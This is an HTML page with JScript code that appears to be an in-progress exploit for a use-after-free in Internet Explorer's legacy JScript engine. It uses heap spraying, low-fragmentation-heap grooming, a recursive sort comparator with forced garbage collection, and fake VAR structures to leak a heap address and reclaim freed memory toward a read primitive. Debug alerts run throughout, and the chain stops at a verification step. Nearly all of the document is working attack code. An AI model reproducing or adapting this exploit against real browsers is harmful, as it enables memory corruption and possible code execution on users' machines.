<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
        <script language="JScript.Compact">
		
		
		var spray_size = 20000;  //200 GcBlocks
		var overlay_size = 20000; 
		var total;
		var dept;
		var spray;
		var tosort = new Array();
		var overlaybackup;
		var overlay;
		var variants; 
		var overlaybackupIndex = -1; //leaked target VAR index in overlaybackup (i,e this index holds the leaked VVAL)
		var staticPropertyNameforRECLAIM = Array(379).join('A');
		



		
		
		
		
		function CreateVar32(Type, ObjPtr, NextVar) {
			var Data = new Array(); // Every element of this array will be a WORD
			Data.push(Type, 0x00, 0x00, 0x00, ObjPtr & 0xFFFF, (ObjPtr >> 16) & 0xFFFF, NextVar & 0xFFFF, (NextVar >> 16) & 0xFFFF);
			return String.fromCharCode.apply(null, Data);
		}//returns 16 bytes(size of VAR)
		
		
		
		
		function setup(){ //reset globals and spray but not freed yet
			dept = 0; 
			total = new Array();//total = array of Untracked vars pointers
			overlay = new Array();
			spray = new Array();

			for(var i = 0; i < overlay_size; i++) overlay[i] = new Object();  //overlay before spray coz we dont want any unnecessary alloc between the spray, free and realloc process, AND also we are overlaying with VVAL(property name(s) of any object) and not GcBlocks
			for(var i = 0; i < spray_size; i++) spray[i] = new Object();
			CollectGarbage();
			return 0;
		}// end of setup
		
		
		
		
		function exploit_uaf(untrack1, untrack2){	//after setup() this will free the setup allocations and collect untracked pointers to total array
			untrack1 = spray[dept*2];
			untrack2 = spray[dept*2 + 1];
			if(dept > 150){
				spray = new Array(); //free the spray
				alert("garbage in uaf");
				CollectGarbage(); //deallocate(free) to heap	
				total.push(untrack1);
				total.push(untrack2);
				return 0;
			}
				
				dept += 1;
				tosort[dept].sort(exploit_uaf);
				total.push(untrack1);
				total.push(untrack2);
				return 0;
		} //exploit() ending
		
		
		
		
		function reclaimUsingIndex(value, fakeVARasPropertyName){ 
			CollectGarbage(); //idk why
			overlaybackup[overlaybackupIndex] = null; //free the...umm this will be a VVAL_disguise_as_GcBlock associated with the leaked index
			CollectGarbage(); //CollectGarbage to really free the above into heap
			overlaybackup[overlaybackupIndex] = new Object();
			overlaybackup[overlaybackupIndex][staticPropertyNameforRECLAIM] = 1; // 0x17a property name size for 0x648 VVAL/NameList allocation size
			overlaybackup[overlaybackupIndex]["BBBBBBBBB"] = 1; //18(9*2) bytes for 32bit...22(11*2) bytes for 64bit
	        overlaybackup[overlaybackupIndex]["\u0003"] = 1; 
			overlaybackup[overlaybackupIndex][fakeVARasPropertyName] = value; //mutable fakeVAR (which we also have a pointer to)
			
		} //ending reclaimUsingIndex
		
		
		
		function leakVVAL(){
		
		
			for(i = 0; i < 310; i++) tosort[i] = [0, 0];
			var LFHBlocks = new Array();
			// Trigger LFH for a size of 0x648
			for(i = 0; i < 50; i++) {
				Temp = new Object();
				Temp[Array(379).join('A')] = 1; // Property name size of 0x17a (378) will produce an allocation of 0x648 bytes
				LFHBlocks.push(Temp);
			}
			
			
			
			setup();			
			tosort[0].sort(exploit_uaf);
		
			for(var i = 0; i < overlay_size; i++) 
			{
				overlay[i][staticPropertyNameforRECLAIM] = 1; //(check the overlay_size)realloc with 300 VVAL or 300 GcBlocks since 1VVAL == 1Gcblock size
				overlay[i]["BBBBBBBBB"] = 1; //18(9*2) bytes for 32bit
				overlay[i]["\u0003"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
				overlay[i]["C"] = i; // The address of this VVAL will be leaked
			}//done relcaim process 
			alert("done reclaim with hash thingy");
		
			overlaybackup = overlay;
			//done overlay for VVAL leak
			
			var LeakedVvalAddress = 0;
		
			for(i = 0; i < total.length; i++){
				if(typeof total[i] === "number" && total[i] > 0x1000){
					alert("done leaking VVAL address...sure we got it?");
					LeakedVvalAddress = total[i];
					break;
				}
			}//done scanning the fake VARs for VVAL address
			

			if( LeakedVvalAddress != 0 ){
				variants = "AA"; // 2 wide char == (4 byte) + (the bstr len i,e 4byte) = 8 byte (filling the GcBlock LINKEDLIST POINTER)
				for(i=0; i < 46; i++) {
					variants += CreateVar32(0x80, LeakedVvalAddress, 0);
				}
				while( variants.length < 0x17a) variants += "A";  // padding
				setup();
				tosort[0].sort(exploit_uaf); //populated total with untrackVARs
			
				for(var i = 0; i < overlay_size; i++) 
				{
					overlay[i][variants] = 1;
				}//reclaim with fake VAR with the address of the leaked VVAL (here VVAL == VAR) coz the first member of VVAL is VAR and not *VAR
				alert("since we got the VVAL address we trying to find the index in overlaybackup");
				
				var LeakedVVALasVAR; // the VAR holding this leaked VVAL (in the overlaybackup)
				for(i = 0; i < total.length; i++){
					if(typeof total[i] === "number"){
						alert("found our leakedVVAL address as VAL in a fake GcBlock");
						overlaybackupIndex = parseInt((total[i]) + ""); // Reads the target index of overlaybackup[(x)]. Since this is of type 0x80 and not directly 0x3, it cannot be easily read directly, so converting it to a string is a quick solution.
						LeakedVVALasVAR = total[i]; //will be used to verify if reclaimUsingIndex() works?
						break;
					}
				}
				reclaimUsingIndex(0x11, "A");
				alert("Leaked overlaybackup index: ");
				alert(overlaybackupIndex);
				

				alert("reading the VVAL address again after reclaim");
				var tempVAR = (LeakedVVALasVAR + "");
				alert(tempVAR);
				
				
			
				if(LeakedVVALasVAR + "" == 0x11) { //since reflect changes from reclaimUsingIndex, we now create a fakeVAR that points the name[] {will be used to create readPRIMITIVE}
					alert("Objectbackup reclaim using Leaked index verification success");
					return 0;//temp ret
				
				}
			
			}	
		
		}
		
		
		function main(){
		
		

			
			leakVVAL();
		
		
		}
		
		main();
			
		
		</script>
	</head>
</html>
